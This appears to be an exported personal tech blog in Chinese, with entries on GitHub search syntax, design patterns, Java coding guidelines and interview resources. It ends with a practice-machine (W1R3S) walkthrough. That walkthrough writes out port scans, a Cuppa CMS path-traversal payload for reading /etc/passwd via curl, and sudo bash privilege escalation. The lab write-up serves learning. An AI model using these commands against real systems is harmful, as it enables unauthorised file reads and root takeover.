<h2 id="github信息收集"><a href="#github信息收集" class="headerlink" title="github信息收集"></a>github信息收集</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gtihub搜索语法:</span><br><span class="line">in:name baidu              #标题搜索含有关键字baidu</span><br><span class="line">in:descripton baidu         #仓库描述搜索含有关键字</span><br><span class="line">in:readme baidu             #Readme文件搜素含有关键字</span><br><span class="line">stars:&gt;3000 baidu           #stars数量大于3000的搜索关键字</span><br><span class="line">stars:1000..3000 baidu      #stars数量大于1000小于3000的搜索关键字</span><br><span class="line">forks:&gt;1000 baidu           #forks数量大于1000的搜索关键字</span><br><span class="line">forks:1000..3000 baidu      #forks数量大于1000小于3000的搜索关键字</span><br><span class="line">size:&gt;=5000 baidu           #指定仓库大于5000k(5M)的搜索关键字</span><br><span class="line">pushed:&gt;2019-02-12 baidu    #发布时间大于2019-02-12的搜索关键字</span><br><span class="line">created:&gt;2019-02-12 baidu   #创建时间大于2019-02-12的搜索关键字</span><br><span class="line">user:name                  #用户名搜素</span><br><span class="line">license:apache-2.0 baidu    #明确仓库的 LICENSE 搜索关键字</span><br><span class="line">language:java baidu         #在java语言的代码中搜索关键字</span><br><span class="line">user:baidu in:name baidu     #组合搜索,用户名baidu的标题含有baidu的</span><br></pre></td></tr></table></figure>

<p><a href="https://docs.github.com/en/search-github/searching-on-github/searching-for-repositories">https://docs.github.com/en/search-github/searching-on-github/searching-for-repositories</a></p>
<p>自动化工具GitDorker: <a href="https://github.com/obheda12/GitDorker%EF%BC%88%E6%B2%A1%E5%AE%89%E6%84%9F%E8%A7%89%E8%87%AA%E5%B7%B1%E6%89%8B%E5%B7%A5github%E6%90%9C%E4%B9%9F%E8%A1%8C%EF%BC%89">https://github.com/obheda12/GitDorker（没安感觉自己手工github搜也行）</a></p>
]]></content>
      <tags>
        <tag>安全</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式</title>
    <url>/2024/07/15/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p>参考资料：</p>
<p><a href="https://blog.csdn.net/guo13313/article/details/79485821">空心菱形，空心三角，实心菱形，实线，虚线在类图中的使用_类图中 空心三角 实心三角 虚线 实线-CSDN博客</a></p>
<p>[设计模式目录 | CS-Notes 面试笔记 (cyc2018.xyz)](<a href="https://www.cyc2018.xyz/%E5%85%B6%E5%AE%83/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F">https://www.cyc2018.xyz/其它/设计模式/设计模式</a> - 目录.html#一、前言)</p>
<p><a href="https://www.bilibili.com/video/BV1Np4y1z7BU">https://www.bilibili.com/video/BV1Np4y1z7BU</a></p>
<span id="more"></span>

<p>当使用策略模式时，确保遵循以下设计原则可以帮助保持代码的灵活性、可维护性和可扩展性：</p>
<ol>
<li><strong>开闭原则（Open-Closed Principle）</strong>：</li>
</ol>
<ul>
<li><ul>
<li>策略模式应该遵循开闭原则，即对扩展开放，对修改关闭。这意味着应该通过添加新的策略类来扩展系统的行为，而不是修改已有的代码。这样可以使得系统更加灵活，易于扩展，同时不会影响到已有的代码逻辑。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>单一职责原则（Single Responsibility Principle）</strong>：</li>
</ol>
<ul>
<li><ul>
<li>每个策略类应该只负责一个特定的行为或算法，而不是负责多个不相关的行为。这样可以确保策略类的设计简单清晰，易于理解和维护。如果一个策略类负责的功能过于复杂，建议将其拆分成多个单一职责的类。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>依赖倒置原则（Dependency Inversion Principle）</strong>：</li>
</ol>
<ul>
<li><ul>
<li>策略模式应该依赖于抽象而不是具体实现，即高层模块不应该依赖于具体的策略类，而是应该依赖于策略接口或抽象类。这样可以降低模块之间的耦合度，使得系统更加灵活和易于扩展。同时，也可以通过依赖注入等方式来动态地替换策略类，从而实现系统的配置和灵活性。</li>
</ul>
</li>
</ul>
<p>遵循以上设计原则可以帮助保持代码的高内聚、低耦合，使得系统更加灵活、可维护和可扩展。同时，也有助于提高代码的质量和可读性，使得系统更加稳定和可靠。</p>
<h1 id="创造型"><a href="#创造型" class="headerlink" title="创造型"></a>创造型</h1><p>单例</p>
<p>[单例（Singleton） | CS-Notes 面试笔记 (cyc2018.xyz)](<a href="https://www.cyc2018.xyz/%E5%85%B6%E5%AE%83/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F">https://www.cyc2018.xyz/其它/设计模式/设计模式</a>  - 单例.html#单例-singleton)</p>
<p>确保一个类只有一个实例，并提供该实例的全局访问点</p>
<p>测试</p>
<p>线程不安全方法：</p>
<p>1、打线程暂停断点，多线程执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">    Singleton.getUniqueInstance();</span><br><span class="line">&#125;, <span class="string">&quot;t1&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">    Singleton.getUniqueInstance();</span><br><span class="line">&#125;, <span class="string">&quot;t2&quot;</span>);</span><br><span class="line">t1.start();</span><br><span class="line">t2.start();</span><br></pre></td></tr></table></figure>

<p>2、提供个接口jmeter 多线程测试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/singleton&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> R&lt;String&gt; <span class="title function_">testSingleton</span><span class="params">()</span>&#123;</span><br><span class="line">        Singleton.getUniqueInstance();</span><br><span class="line">        <span class="keyword">return</span> R.success(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>理论上可行，还未实操。</p>
<p><del>done：学下jmeter使用，然后实操</del></p>
<p>关键点</p>
<p><a href="https://blog.csdn.net/u012723673/article/details/80682208">Java volatile关键字最全总结：原理剖析与实例讲解(简单易懂)-CSDN博客</a></p>
<p>懒汉、线程安全、双重校验 +  volatile、静态内部类实现、枚举实现（<a href="https://www.bilibili.com/video/BV1Np4y1z7BU?p=28&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">28.设计模式-创建者模式-单例设计模式-枚举方式_哔哩哔哩_bilibili</a>）、序列化反射破坏单例模式</p>
<h2 id="简单工厂（Simple-Factory）"><a href="#简单工厂（Simple-Factory）" class="headerlink" title="简单工厂（Simple Factory）"></a>简单工厂（Simple Factory）</h2><p>在创建一个对象时不向客户暴露内部细节，并提供一个创建对象的通用接口。</p>
<h2 id="工厂方法（Factory-Method）"><a href="#工厂方法（Factory-Method）" class="headerlink" title="工厂方法（Factory Method）"></a>工厂方法（Factory Method）</h2><p>定义了一个创建对象的接口，但由子类决定要实例化哪个类。工厂方法把实例化操作推迟到子类。</p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>架构</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里代码规范学习</title>
    <url>/2024/06/28/%E9%98%BF%E9%87%8C%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>在线阅读链接：<a href="https://developer.aliyun.com/ebook/386/read?spm=a2c6h.26392459.ebook-detail.4.63392867ZDnuXr">https://developer.aliyun.com/ebook/386/read?spm=a2c6h.26392459.ebook-detail.4.63392867ZDnuXr</a></p>
<p><a href="https://www.bilibili.com/video/BV1FV411W7a6/?spm_id_from=333.337.search-card.all.click">2021最新最全阿里巴巴Java开发手册最新版(嵩山版150P)【Java编码规范】_哔哩哔哩_bilibili</a></p>
<span id="more"></span>

<p>[toc]</p>
<h1 id="编码规范"><a href="#编码规范" class="headerlink" title="编码规范"></a>编码规范</h1><h2 id="命名风格"><a href="#命名风格" class="headerlink" title="命名风格"></a>命名风格</h2><p>记住即可，有特殊需要备注的在这里写出来</p>
<p><a href="https://blog.csdn.net/Dontla/article/details/124428174">小驼峰命名法（lower camel case）和大驼峰命名法（upper camel case）_小驼峰法和大驼峰法-CSDN博客</a></p>
<p>总结：</p>
<p>类名：UpperCamelCase </p>
<p>方法名、参数名、成员变量、局部变量：lowerCamelCase</p>
<p>常量命名：全部大写、单词间用下划线隔开</p>
<p>【强制】POJO 类中布尔类型的变量，都不要加 is，否则部分框架解析会引起序列化错误。</p>
<p>参考链接：</p>
<p><a href="https://www.cnblogs.com/flunggg/p/12184634.html">POJO类中布尔类型的变量都不要加is前缀详解 - flunggg - 博客园</a></p>
<p><a href="https://blog.csdn.net/qq_39746820/article/details/124005908">Mybatis学习之数据库字段与实体属性的映射_数据库表中的字段映射-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/q7w8e9r4/article/details/133638083">深入了解：MybatisPlus中@TableField注解的使用-CSDN博客</a></p>
<p>mysql数据库字段为is_deleted 可以将其映射到deleted</p>
<p>【推荐】如果模块、接口、类、方法使用了设计模式，在命名时体现出具体模式</p>
<p>说明：将设计模式体现在名字中，有利于阅读者快速理解架构设计理念。</p>
<p>接口类中的方法和属性不要加任何修饰符号（public 也不要加），保持代码的简洁 性，并加上有效的 Javadoc 注释。尽量不要在接口里定义变量，如果一定要定义变量，肯定是 与接口方法相关，并且是整个应用的基础常量。</p>
<p>参考链接：<a href="https://blog.csdn.net/qq_44543508/article/details/102609910">java抽象类（abstract）与接口（Interface）的区别_javaabstract 和interface区别-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_19782019/article/details/80259836">JAVA基础——接口（全网最详细教程）_java接口怎么写-CSDN博客</a></p>
<h2 id="常量定义"><a href="#常量定义" class="headerlink" title="常量定义"></a>常量定义</h2><p>【强制】不允许任何魔法值（即未经定义的常量）直接出现在代码中</p>
<p>参考：[不要再使用魔法值了！_【推荐】不允许任何魔法值(即未经预先定义的常量)直接出现在代码中。 反例: &#96;&#96;&#96; s-CSDN博客](<a href="https://blog.csdn.net/qq_41267618/article/details/103029427">https://blog.csdn.net/qq_41267618/article/details/103029427</a>)</p>
<p>也就是什么常量，最好用一个变量表达他的意思，不然会给其他阅读者带来阅读障碍。</p>
<h2 id="代码格式"><a href="#代码格式" class="headerlink" title="代码格式"></a>代码格式</h2><h2 id="OOP规约"><a href="#OOP规约" class="headerlink" title="OOP规约"></a>OOP规约</h2><p>【强制】避免通过一个类的对象引用访问此类的静态变量或静态方法，无谓增加编译器解析成 本，直接用类名来访问即可。</p>
<p><a href="https://juejin.cn/post/6924958351684009991">避免通过一个类的对象引用访问此类的静态变量或静态方法，无谓增加编译器解析成本，直接用类名来访问即可，为什么呢？ - 掘金</a></p>
<p>【强制】定义DO&#x2F;DTO&#x2F;VO等POJO类时，不要设定任何属性默认值。</p>
<p><a href="https://segmentfault.com/q/1010000019768374">java - 如何在同时满足《阿里规约·华山版》OOP规约的12和14条的约束下给类赋默认值？ - SegmentFault 思否</a></p>
<p>【推荐】使用索引访问用String的split方法得到的数组时，需做最后一个分隔符后有无 内容的检查，否则会有抛IndexOutOfBoundsException的风险。</p>
<p><a href="https://blog.csdn.net/MaYuKang/article/details/102903336">String.Split()方法最后一个分隔符后有无内容的检查_split 最后一个分隔符-CSDN博客</a></p>
<h2 id="集合处理"><a href="#集合处理" class="headerlink" title="集合处理"></a>集合处理</h2><p>【强制】使用工具类Arrays.asList()把数组转换成集合时，不能使用其修改集合相关的方 法，它的add&#x2F;remove&#x2F;clear方法会抛出UnsupportedOperationException异常</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String[] str = new String[] &#123; &quot;you&quot;, &quot;wu&quot; &#125;;</span><br><span class="line">List list = Arrays.asList(str);</span><br><span class="line">str[0] = &quot;aaa&quot;;</span><br><span class="line">System.out.println(Arrays.toString(str));</span><br><span class="line">System.out.println(list.toString());</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[aaa, wu]</span><br><span class="line">[aaa, wu]</span><br></pre></td></tr></table></figure>

<p>泛型通配符＜? extends T＞来接收返回的数据，此写法的泛型集合不能使用 add 方 法， 而＜? super T＞不能使用 get 方法，作为接口调用赋值时易出错的理解</p>
<p><a href="https://blog.csdn.net/weixin_43636205/article/details/131579083">泛型通配符＜? extends T＞来接收返回的数据，此写法的泛型集合不能使用 add 方 法， 而＜? super T＞不能使用 get 方法，作为接口调用赋值时易出错的理解_泛型通配符来接收返回的数据,此写法的泛型集 合不能使用 add 方法,-CSDN博客</a></p>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>【强制】velocity调用POJO类的属性时，建议直接使用属性名取值即可，模板引擎会自动按 规范调用POJO的getXxx()，如果是boolean基本数据类型变量（boolean命名不需要加is 前缀），会自动调用isXxx()方法。</p>
<p>都没听过velocity：<a href="https://developer.aliyun.com/ask/324884">Java velocity 调用 POJO 类的属性时如何取值？_问答-阿里云开发者社区</a></p>
<h1 id="异常日志"><a href="#异常日志" class="headerlink" title="异常日志"></a>异常日志</h1><p>【推荐】定义时区分unchecked &#x2F; checked 异常，避免直接抛出new RuntimeException()， 更不允许抛出Exception或者Throwable，应使用有业务含义的自定义异常。推荐业界已定义 过的自定义异常，如：DAOException &#x2F; ServiceException等。 </p>
<p><a href="https://blog.csdn.net/qq_34039868/article/details/107145009">Java中的异常（checked异常和unchecked异常）_java 用户自定义的异常 属于 checked exception吗-CSDN博客</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/661176797">Java 受检（Checked）异常和非受检（Unchecked）异常 - 知乎</a></p>
<p><a href="https://blog.csdn.net/u010498753/article/details/86014964">阿里巴巴开发手册解析个人笔记（五）Mysql规约(四）ORM 映射_不要用 resultclass 当返回参数-CSDN博客</a></p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>面经资源整理</title>
    <url>/2024/06/28/%E9%9D%A2%E7%BB%8F%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<p><a href="https://www.xiaohongshu.com/explore/6655a3a40000000016011053?note_flow_source=wechat">后端0基础→大厂实习完整版学习路线分享✅ - 小红书 (xiaohongshu.com)</a></p>
<p><a href="https://www.nowcoder.com/discuss/551083645553954816">Java学习路线总结_牛客网 (nowcoder.com)</a></p>
<span id="more"></span>

<p><a href="https://topjavaer.cn/">主页 | Java学习&amp;面试指南-程序员大彬 (topjavaer.cn)</a></p>
<p><a href="https://xiaolincoding.com/">小林coding (xiaolincoding.com)</a></p>
<p><a href="https://javaguide.cn/home.html#java">JavaGuide（Java学习&amp;面试指南） | JavaGuide</a></p>
<p><a href="https://interviewguide.cn/">阿秀的学习笔记 (interviewguide.cn)</a></p>
<p><a href="https://github.com/viego1999/JavaWxy/blob/master/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95.md">JavaWxy&#x2F;面试记录.md at master · viego1999&#x2F;JavaWxy (github.com)</a></p>
<p>小林coding公众号</p>
<p>java基基公众号</p>
<p>芋道源码公众号</p>
<p><a href="https://github.com/xbox1994/Java-Interview">xbox1994&#x2F;Java-Interview: 经历BAT面试后总结的【高级Java后台开发面试指南】，纯净干货无废话，针对高频面试点 (github.com)</a></p>
<p><a href="https://github.com/DreamCats/java-notes">DreamCats&#x2F;java-notes: 自己的学习笔记。包含：个人秋招经历、🐂客面经问题按照频率总结、Java一系列知识、数据库、分布式、微服务、前端、技术面试、每日文章等(持续更新) (github.com)</a></p>
<p><a href="https://cyc2018.github.io/CS-Notes/#/">CS-Notes (cyc2018.github.io)</a></p>
<p><a href="https://learn.lianglianglee.com/">技术摘抄 (lianglianglee.com)</a></p>
<p><a href="https://tech.meituan.com/">美团技术团队 (meituan.com)</a></p>
<p><a href="https://pdai.tech/">https://pdai.tech/</a></p>
<p><a href="https://nageoffer.com/">拿个offer-开源&amp;项目实战 | 拿个offer-开源&amp;项目实战 (nageoffer.com)</a></p>
<p><a href="https://open8gu.com/redis/trending/utx7gm7khpfuq3h6/">Redis为什么这么快？ | 大话面试</a></p>
<p>面试题目（拿个offer、javaguide、牛客、javaguide面试指北）</p>
<p><a href="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzUxODAzNDg4NQ==&action=getalbum&album_id=2845716833935540227&subscene=159&subscene=21&scenenote=https://mp.weixin.qq.com/s?__biz=MzUxODAzNDg4NQ==&mid=2247539528&idx=1&sn=fa9797ac2f8d77000392b40b0a6bf9dd&chksm=f98d1fe2cefa96f4f506dbbb99879e42857611c81893caff6f62058825987f4af53309be39f2&scene=21%23wechat_redirect&nolastread=1#wechat_redirect">#后端面经</a></p>
<h2 id="实习准备todo"><a href="#实习准备todo" class="headerlink" title="实习准备todo"></a>实习准备todo</h2><p><a href="https://articles.zsxq.com/id_7mcfhuacmhzs.html">Java面试常见问题总结（2024最新版）</a></p>
<p><a href="https://www.yuque.com/snailclimb/mf2z3k">《Java面试指北》</a></p>
<p><a href="https://www.yuque.com/snailclimb/tangw3">《后端面试高频系统设计&amp;场景题》</a></p>
<p><a href="https://xiaolincoding.com/">小林coding</a></p>
<p><a href="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzUxODAzNDg4NQ==&action=getalbum&album_id=2845716833935540227&subscene=159&subscene=21&scenenote=https://mp.weixin.qq.com/s?__biz=MzUxODAzNDg4NQ==&mid=2247539528&idx=1&sn=fa9797ac2f8d77000392b40b0a6bf9dd&chksm=f98d1fe2cefa96f4f506dbbb99879e42857611c81893caff6f62058825987f4af53309be39f2&scene=21%23wechat_redirect&nolastread=1#wechat_redirect">#后端面经</a></p>
<ul>
<li><p><input checked="" disabled="" type="checkbox"> 
过下小林coding</p>
</li>
<li><p><input disabled="" type="checkbox"> 
过下小林coding后端面经</p>
</li>
<li><p><input disabled="" type="checkbox"> 
过下java面试指北</p>
</li>
<li><p><input disabled="" type="checkbox"> 
看完12306互联网公司面试题 </p>
</li>
<li><p><input checked="" disabled="" type="checkbox"> 
看完12306面试常见问题解答</p>
</li>
<li><p><input checked="" disabled="" type="checkbox"> 
看完12306常见问题QA</p>
</li>
<li><p><input disabled="" type="checkbox"> 
看完星球专栏场景实战</p>
</li>
<li><p><input disabled="" type="checkbox"> 
看完科普小课堂</p>
</li>
<li><p><input disabled="" type="checkbox"> 
看完优质面经</p>
</li>
<li><p><input disabled="" type="checkbox"> 
完成常见题目整理</p>
</li>
<li><p><input disabled="" type="checkbox"> 
图解mysql</p>
</li>
<li><p><input disabled="" type="checkbox"> 
图解redis</p>
</li>
<li><p><input disabled="" type="checkbox"> 
RocketMQ面试题</p>
</li>
<li><p><input disabled="" type="checkbox"> 
过下javaguide</p>
</li>
<li><p><input disabled="" type="checkbox"> 
netty</p>
</li>
</ul>
<h2 id="零碎得面试题"><a href="#零碎得面试题" class="headerlink" title="零碎得面试题"></a>零碎得面试题</h2><h3 id="ShardShere-如何去适配逻辑表，比如按月分，一年有-12-个月，第-13-个表怎么告诉它是那张表呢？"><a href="#ShardShere-如何去适配逻辑表，比如按月分，一年有-12-个月，第-13-个表怎么告诉它是那张表呢？" class="headerlink" title="ShardShere 如何去适配逻辑表，比如按月分，一年有 12 个月，第 13 个表怎么告诉它是那张表呢？"></a>ShardShere 如何去适配逻辑表，比如按月分，一年有 12 个月，第 13 个表怎么告诉它是那张表呢？</h3><p>可以配置文件进行配置，也可以自定义分片算法实现ComplexKeysShardingAlgorithm</p>
<h3 id="介绍一下雪花算法？是干啥用的？"><a href="#介绍一下雪花算法？是干啥用的？" class="headerlink" title="介绍一下雪花算法？是干啥用的？"></a>介绍一下雪花算法？是干啥用的？</h3><p><a href="https://blog.csdn.net/qq_41573860/article/details/124119358">雪花算法原理及实现_雪花算法实现原理-CSDN博客</a></p>
<p><a href="https://www.cnblogs.com/relucent/p/4955340.html">Twitter的分布式自增ID算法snowflake (Java版) - relucent - 博客园</a></p>
<p>用来生成递增的分布式ID。1 + 41 + 10 + 12</p>
<p>雪花算法最后12位可能一直是偶数（当在低频模式下时，序号始终为0，导致生成ID始终为偶数），可以使用随机数避免出现</p>
<h3 id="Nacos-在项目中是做什么的呢"><a href="#Nacos-在项目中是做什么的呢" class="headerlink" title="Nacos 在项目中是做什么的呢"></a>Nacos 在项目中是做什么的呢</h3><p><a href="https://blog.csdn.net/jb84006/article/details/117448534">1、nacos功能简介_nacos是干嘛的-CSDN博客</a></p>
<p>nacos一般有注册中心和配置中心得作用</p>
<p>注册中心：spring.cloud.nacos.discovery.server-addr</p>
<p>配置中心：spring.cloud.nacos.config</p>
<h3 id="有用到的-RPC-框架吗？-说说"><a href="#有用到的-RPC-框架吗？-说说" class="headerlink" title="有用到的 RPC 框架吗？ 说说"></a>有用到的 RPC 框架吗？ 说说</h3><p><strong>FeignClient</strong> 是一个声明式 HTTP 客户端，严格来说，它不算传统意义上的 <strong>RPC 框架</strong>，但在某些场景下可以用来实现类似于 RPC 的功能。</p>
<h3 id="ES-主要是来干嘛的？为什么要引入-ES"><a href="#ES-主要是来干嘛的？为什么要引入-ES" class="headerlink" title="ES 主要是来干嘛的？为什么要引入 ES"></a>ES 主要是来干嘛的？为什么要引入 ES</h3><p><a href="https://www.yuque.com/snailclimb/mf2z3k/simu3iyhd87kgp3e">Elasticsearch 常见面试题总结</a></p>
<p><a href="https://tech.meituan.com/2022/11/17/elasicsearch-optimization-practice-based-on-run-length-encoding.html">美团外卖搜索基于Elasticsearch的优化实践 - 美团技术团队</a></p>
<h3 id="Caffeine：Caffeine-的性能为何如此优秀？"><a href="#Caffeine：Caffeine-的性能为何如此优秀？" class="headerlink" title="Caffeine：Caffeine 的性能为何如此优秀？"></a><strong>Caffeine：Caffeine 的性能为何如此优秀？</strong></h3><p><a href="https://www.yuque.com/snailclimb/mf2z3k/oson7u6g1fxzxkt4">Caffeine：Caffeine 的性能为何如此优秀？</a></p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><hr>
<h2 id="408面试题"><a href="#408面试题" class="headerlink" title="408面试题"></a>408面试题</h2><p><a href="https://www.yuque.com/snailclimb/mf2z3k/xs5il4mv8ge9h545">计算机网络常见面试题自测</a></p>
<h2 id="系统设计题"><a href="#系统设计题" class="headerlink" title="系统设计题"></a>系统设计题</h2>]]></content>
      <tags>
        <tag>java</tag>
        <tag>资源整理</tag>
      </tags>
  </entry>
  <entry>
    <title>八股文</title>
    <url>/2023/04/04/%E9%9D%A2%E7%BB%8F/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="f0929dd1c0e2e5f8d653d8608939ba62098682d32a41eb320502a37095b1c741"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>记录</tag>
        <tag>资源整理</tag>
      </tags>
  </entry>
  <entry>
    <title>靶机玩耍</title>
    <url>/2023/03/16/%E9%9D%B6%E6%9C%BA%E7%8E%A9%E8%80%8D/</url>
    <content><![CDATA[<p>安全学习过程中的一些靶机记录</p>
<p><a href="https://www.bilibili.com/video/BV13E4m1d7wu/?spm_id_from=333.337.search-card.all.click&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">「红队笔记」靶机精讲：HTB Crafty 上 - 给史诗级漏洞该有的尊重，完整的Log4Shell漏洞利用链条，更有攻击、防御、挖洞等全角度分析。_哔哩哔哩_bilibili</a></p>
<p>参考红队笔记视频，虽然转行了，但还是谢谢大佬带我一个小白入门</p>
<span id="more"></span>



<h2 id="W1R3S"><a href="#W1R3S" class="headerlink" title="W1R3S"></a>W1R3S</h2><p>获得靶机IP（记得kali、靶机网络都改桥接）得到ip 192.168.1.28</p>
<h3 id="nmap-扫服务"><a href="#nmap-扫服务" class="headerlink" title="nmap 扫服务"></a>nmap 扫服务</h3><p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316092242512.png" alt="image-20230316092242512"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap --min-rate 10000  -p-  192.168.1.28      （全面的扫描端口）</span><br><span class="line">sudo nmap -sT -sV -O -p21,22,80,3306 192.168.1.28 （扫描对应端口获取详细信息）（TCP扫描）</span><br><span class="line">    PORT     STATE SERVICE VERSION</span><br><span class="line">    21/tcp   open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">    22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">    80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">    3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">    10123/tcp open  unknown</span><br><span class="line">    MAC Address: 00:0C:29:A0:15:2E (VMware)</span><br><span class="line">    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">    Device type: general purpose</span><br><span class="line">    Running: Linux 3.X|4.X|5.X</span><br><span class="line">    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.1</span><br><span class="line">    OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9, Linux 5.1</span><br><span class="line">    Network Distance: 1 hop</span><br><span class="line">    Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">    Nmap done: 1 IP address (1 host up) scanned in 13.06 seconds</span><br><span class="line">sudo nmap -sU -p21,22,80,3306 192.168.1.28 （udp扫描）//记住还可以扫IPV6</span><br><span class="line">sudo nmap --script=vuln -p21,22,80,3306 192.168.1.28  //（扫描插件漏洞） </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="访问ftp"><a href="#访问ftp" class="headerlink" title="访问ftp"></a>访问ftp</h3><p>匿名 （获得对应文件）（命令行访问记得输入binary命令，防止破坏可执行文件）</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316092603021.png" alt="image-20230316092603021"></p>
<h3 id="访问web"><a href="#访问web" class="headerlink" title="访问web"></a>访问web</h3><h4 id="目录爆破：dirb、gobuster、feroxbuster"><a href="#目录爆破：dirb、gobuster、feroxbuster" class="headerlink" title="目录爆破：dirb、gobuster、feroxbuster"></a>目录爆破：dirb、gobuster、feroxbuster</h4><p>使用dirb爆破找到<a href="http://192.168.1.28/administrator/installation/">http://192.168.1.28/administrator/installation/</a></p>
<p>数据库创建失败</p>
<p>开始看cms（cuppa）有漏洞没有</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit cuppa</span><br><span class="line">searchsploit  cuppa cms -m 25791  </span><br><span class="line">cat 25971.txt</span><br></pre></td></tr></table></figure>

<p>访问<a href="http://192.168.1.28/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd%E5%A4%B1%E8%B4%A5">http://192.168.1.28/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd失败</a></p>
<p><a href="http://192.168.1.28/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.1.28/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a> 失败</p>
<p><a href="http://192.168.1.28/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.1.28/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a> 成功显示（但没有东西）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl    --data-urlencode urlConfig=../../../../../../../../../etc/passwd  http://192.168.1.28/administrator/alerts/alertConfigField.php  （需要post）</span><br></pre></td></tr></table></figure>

<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure>

<p>sudo 提权</p>
<p>可以ftp提权，也可以sudo &#x2F;bin&#x2F;bash，也可也sudo time &#x2F;root&#x2F;flag.txt</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316093047508.png" alt="image-20230316093047508"></p>
<p>成功</p>
<h2 id="jarbas"><a href="#jarbas" class="headerlink" title="jarbas"></a>jarbas</h2><ul>
<li><p>先nmap扫描</p>
<ul>
<li><p>得到靶机IP 192.168.1.30<img src="https://api2.mubu.com/v3/document_image/e874e4e1-6981-469c-9d66-09d0b8a0c953-18494357.jpg" alt="img"></p>
</li>
